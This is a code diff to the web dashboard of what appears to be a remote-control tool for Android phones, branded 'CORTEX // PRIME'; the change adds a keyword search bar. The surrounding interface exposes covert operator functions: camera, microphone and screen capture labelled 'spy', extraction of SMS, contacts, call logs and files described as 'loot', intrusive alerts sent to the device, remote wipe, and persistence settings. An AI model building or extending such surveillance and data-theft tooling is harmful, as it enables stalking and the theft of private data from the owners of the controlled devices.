@@ -131,6 +131,10 @@
         @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
         @keyframes scan { 0% { top: 0%; } 100% { top: 100%; } }
+        @keyframes glitchHighlight { 0% { box-shadow: 0 0 0px var(--primary); border-color: var(--surface-light); } 50% { box-shadow: 0 0 20px var(--primary); border-color: var(--primary); } 100% { box-shadow: 0 0 0px var(--primary); border-color: var(--surface-light); } }
+        .search-highlight { animation: glitchHighlight 1.5s ease; }
+        #search-bar { display: none; position: absolute; left: 0; top: 100%; width: 100%; background: var(--surface); padding: 10px; border-bottom: 1px solid var(--primary); z-index: 1000; box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
+        #search-input { width: 100%; background: #000; border: 1px solid var(--primary); color: var(--primary); padding: 10px; font-family: inherit; font-size: 1rem; }
     </style>
 </head>
 <body>
@@ -155,13 +159,19 @@
 
     <header>
         <div class="logo">CORTEX // PRIME</div>
-        <div id="connectionStatus" class="status-dot"></div>
+        <div style="display:flex; gap:15px; align-items:center;">
+            <div onclick="toggleSearch()" style="cursor:pointer; font-size:1.2rem; color:var(--primary);">🔍</div>
+            <div id="connectionStatus" class="status-dot"></div>
+        </div>
+        <div id="search-bar">
+            <input type="text" id="search-input" placeholder="ENTER KEYWORD (e.g. LOOT, PANIC, EYES)..." onkeyup="if(event.key==='Enter') executeSearch()">
+        </div>
     </header>
 
     <main>
         <div id="view-dash" class="section active">
             <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 5px;">
-                <h2>Active Device Cluster</h2>
+                <h2 data-search="cluster, active, targets, signal">Active Device Cluster</h2>
                 <button class="btn" onclick="fetchLatest()" style="font-size: 0.6rem; padding: 4px 8px;">REFRESH SCAN</button>
             </div>
             <div class="card" id="device-list-container" style="padding:0; max-height: 300px; overflow-y: auto;">
@@ -173,14 +183,14 @@
                  <button class="btn" onclick="selectAll(false)">Clear</button>
             </div>
 
-            <h2>Telemetry Feed <span id="feed-target-label" style="font-size:0.6rem; color:var(--primary); opacity:0.6;"></span></h2>
+            <h2 data-search="feed, telemetry, live, logs">Telemetry Feed <span id="feed-target-label" style="font-size:0.6rem; color:var(--primary); opacity:0.6;"></span></h2>
             <div class="card" id="feed-container" style="max-height: 350px; overflow-y: auto;">
                 <div style="text-align: center; color: #444;">Select a device to view feed</div>
             </div>
         </div>
 
         <div id="view-cmd" class="section">
-            <h2>Interference</h2>
+            <h2 data-search="interference, alerts, signals, comms, ring, ping, toast, intent">Interference</h2>
             <div class="card">
                 <div class="cmd-row"><label class="cmd-label">User Alert</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('TOAST')">?</button><input type="text" id="val-toast" placeholder="Toast msg..."><button class="btn" onclick="sendCmd('TOAST')">Toast</button></div></div>
                 <div class="cmd-row"><label class="cmd-label">Sonic Alarm</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('RING')">?</button><input type="number" id="val-ring" placeholder="Secs (e.g. 10)"><button class="btn" onclick="sendCmd('RING')">Ring</button></div></div>
@@ -212,7 +222,7 @@
                 </div>
             </div>
 
-            <h2>Surveillance (Optical / Audio / Display)</h2>
+            <h2 data-search="surveillance, eyes, ears, camera, audio, spy, snapshot, screenshot, mic">Surveillance (Optical / Audio / Display)</h2>
             <div class="card">
                 <div class="cmd-row">
                     <label class="cmd-label">Display Snapshot</label>
@@ -255,7 +265,7 @@
                 </div>
             </div>
 
-            <h2>Data Extraction & Forensics</h2>
+            <h2 data-search="extraction, forensics, loot, files, sms, scraper, vault, pull, push, contacts, calls">Data Extraction & Forensics</h2>
             <div class="card">
                 <div class="cmd-row">
                     <label class="cmd-label">Accessibility Audit (UI Scraper)</label>
@@ -295,7 +305,7 @@
                 <div class="cmd-row"><label class="cmd-label">Diagnostic System Logs</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('GET_LOGS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_LOGS')">Export Logcat</button></div></div>
             </div>
 
-            <h2>Maintenance</h2>
+            <h2 data-search="maintenance, gear, interval, pulse, sync, ready, work, burst">Maintenance</h2>
             <div class="card">
                 <div class="cmd-row"><label class="cmd-label">Burst Mode (Stay Ready)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('STAY_READY')">?</button><input type="number" id="val-burst" placeholder="Mins (e.g. 15)"><button class="btn" onclick="sendCmd('STAY_READY')">Activate</button></div></div>
                 <div class="cmd-row"><label class="cmd-label">Work Cycle</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('SET_INTERVAL')">?</button><input type="number" id="val-work" placeholder="Mins (Min 15)"><button class="btn" onclick="sendCmd('SET_INTERVAL')">Set</button></div></div>
@@ -322,7 +332,7 @@
                 </div>
             </div>
 
-            <h2 style="background: var(--danger)">Crisis Management</h2>
+            <h2 style="background: var(--danger)" data-search="crisis, panic, nuke, wipe, red, beacon, suicide">Crisis Management</h2>
             <div class="card" style="border-color: var(--danger)">
                 <div class="cmd-row">
                     <label class="cmd-label">Code Red (Beacon)</label>
@@ -351,7 +361,7 @@
 
         <div id="view-files" class="section">
             <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
-                <h2>Data Vault</h2>
+                <h2 data-search="vault, storage, files, backups, data, decrypt">Data Vault</h2>
                 <button class="btn" id="vault-back-btn" onclick="vaultBack()" style="display:none; font-size:0.6rem;">← BACK</button>
             </div>
             <div id="vault-path-display" style="font-size: 0.6rem; color: var(--primary); margin-bottom: 10px; opacity: 0.5; overflow: hidden; text-overflow: ellipsis;">ROOT://</div>
@@ -777,6 +787,48 @@
         function toggleAuditData(id) {
             const el = document.getElementById(id);
             el.style.display = el.style.display === 'none' ? 'block' : 'none';
+        }
+
+        function toggleSearch() {
+            const bar = document.getElementById('search-bar');
+            const input = document.getElementById('search-input');
+            const isVisible = bar.style.display === 'block';
+            bar.style.display = isVisible ? 'none' : 'block';
+            if (!isVisible) input.focus();
+        }
+
+        function executeSearch() {
+            const term = document.getElementById('search-input').value.toLowerCase().trim();
+            if (!term) return;
+            
+            const headers = document.querySelectorAll('h2[data-search]');
+            let found = false;
+
+            for (const h of headers) {
+                const keywords = h.getAttribute('data-search').split(',').map(k => k.trim());
+                if (keywords.some(k => k.includes(term)) || h.innerText.toLowerCase().includes(term)) {
+                    // 1. Identify parent section and switch tab
+                    const section = h.closest('.section');
+                    const tabId = section.id.replace('view-', '');
+                    switchTab(tabId);
+
+                    // 2. Scroll and Highlight
+                    setTimeout(() => {
+                        h.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                        const card = h.nextElementSibling;
+                        if (card && card.classList.contains('card')) {
+                            card.classList.add('search-highlight');
+                            setTimeout(() => card.classList.remove('search-highlight'), 2000);
+                        }
+                    }, 100);
+
+                    found = true;
+                    break;
+                }
+            }
+
+            if (found) toggleSearch();
+            else toast("NO MATCHING SECTOR FOUND", "danger");
         }
 
         function saveFolderNote(name, event) {
